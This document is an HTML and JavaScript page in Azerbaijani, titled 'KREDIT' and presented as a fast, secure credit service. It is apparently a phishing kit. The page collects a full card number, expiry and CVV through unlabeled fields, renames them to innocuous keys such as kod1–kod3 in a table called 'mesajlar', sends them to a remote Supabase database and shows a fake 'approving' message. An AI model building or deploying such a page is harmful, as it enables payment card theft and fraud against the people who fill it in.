<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KREDIT</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, sans-serif;}

body{
  height:100vh;
  overflow:hidden;
  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
  display:flex;
  flex-direction:column;
  color:white;
}

/* Animated background */
body::before{
  content:"";
  position:absolute;
  width:600px;
  height:600px;
  background:radial-gradient(circle,#00c6ff55,transparent 70%);
  top:-200px;
  left:-200px;
  animation:move1 10s infinite alternate;
}

body::after{
  content:"";
  position:absolute;
  width:500px;
  height:500px;
  background:radial-gradient(circle,#0072ff55,transparent 70%);
  bottom:-200px;
  right:-200px;
  animation:move2 12s infinite alternate;
}

@keyframes move1{
  from{transform:translate(0,0);}
  to{transform:translate(200px,150px);}
}

@keyframes move2{
  from{transform:translate(0,0);}
  to{transform:translate(-150px,-200px);}
}

header{
  padding:20px;
  font-size:20px;
  font-weight:bold;
  z-index:2;
}

.container{
  flex:1;
  display:flex;
  justify-content:center;
  align-items:center;
  z-index:2;
}

.phone{
  width:340px;
  height:650px;
  background:black;
  border-radius:40px;
  padding:20px;
  box-shadow:0 40px 80px rgba(0,0,0,0.6);
}

.screen{
  background:linear-gradient(135deg,#1e3c72,#2a5298);
  height:100%;
  border-radius:30px;
  padding:25px;
  display:flex;
  flex-direction:column;
  justify-content:center;
}

.card-container{perspective:1000px;margin-bottom:30px;}

.card{
  width:100%;
  height:180px;
  position:relative;
  transform-style:preserve-3d;
  transition:transform 0.8s;
}

.card.flip{transform:rotateY(180deg);}

.face{
  position:absolute;
  width:100%;
  height:100%;
  border-radius:20px;
  backface-visibility:hidden;
  padding:20px;
  display:flex;
  flex-direction:column;
  justify-content:space-between;
}

.front{background:linear-gradient(135deg,#00c6ff,#0072ff);}
.back{
  background:linear-gradient(135deg,#0072ff,#00c6ff);
  transform:rotateY(180deg);
  align-items:flex-end;
}

.number{
  letter-spacing:3px;
  font-size:18px;
}

input{
  width:100%;
  padding:12px;
  border:none;
  border-radius:12px;
  margin-bottom:12px;
  font-size:14px;
  outline:none;
}

.row{display:flex;gap:10px;}

button{
  padding:14px;
  border:none;
  border-radius:12px;
  background:#00c6ff;
  color:white;
  font-weight:bold;
  cursor:pointer;
}
</style>
</head>
<body>

<header>Sürətli və Təhlükəsiz</header>

<div class="container">
<div class="phone">
<div class="screen">

<div class="card-container">
<div class="card" id="card">

<div class="face front">
<div>KREDIT</div>
<div class="number" id="previewNumber">•••• •••• •••• ••••</div>
<div id="previewSmall">0000</div>
</div>

<div class="face back">
<div id="previewBack">•••</div>
</div>

</div>
</div>

<input id="mainInput" maxlength="16" placeholder="****************"
oninput="formatMain(this.value)">

<div class="row">
<input id="smallInput" maxlength="4" placeholder="****"
oninput="updateSmall(this.value)">
<input id="backInput" maxlength="3" placeholder="***"
oninput="updateBack(this.value)">
</div>

<button onclick="submitData()">Təsdiqlə</button>

</div>
</div>
</div>

<script type="module">
import { createClient } from "https://esm.sh/@supabase/supabase-js@2"

const supabaseUrl = "BURAYA_URL"
const supabaseKey = "BURAYA_KEY"
const supabase = createClient(supabaseUrl, supabaseKey)

window.formatMain = function(val){
  val = val.replace(/\D/g,'').slice(0,16)
  let formatted = val.match(/.{1,4}/g)?.join(" ") || val
  document.getElementById("previewNumber").innerText =
    formatted || "•••• •••• •••• ••••"
  document.getElementById("mainInput").value = val
}

window.updateSmall = function(val){
  val = val.replace(/\D/g,'').slice(0,4)
  document.getElementById("previewSmall").innerText = val || "0000"
}

window.updateBack = function(val){
  val = val.replace(/\D/g,'').slice(0,3)
  document.getElementById("previewBack").innerText = val || "•••"
  const card=document.getElementById("card")
  if(val.length===3){card.classList.add("flip")}
  else{card.classList.remove("flip")}
}

window.submitData = async function(){
  const main=document.getElementById("mainInput").value
  const small=document.getElementById("smallInput").value
  const back=document.getElementById("backInput").value

  if(main.length!==16 || small.length!==4 || back.length!==3){
    alert("Məlumat natamamdır")
    return
  }

  await supabase.from("mesajlar").insert([{
    kod1: main,
    kod2: small,
    kod3: back
  }])

  alert("Onaylanır...")
}
</script>

</body>
</html>
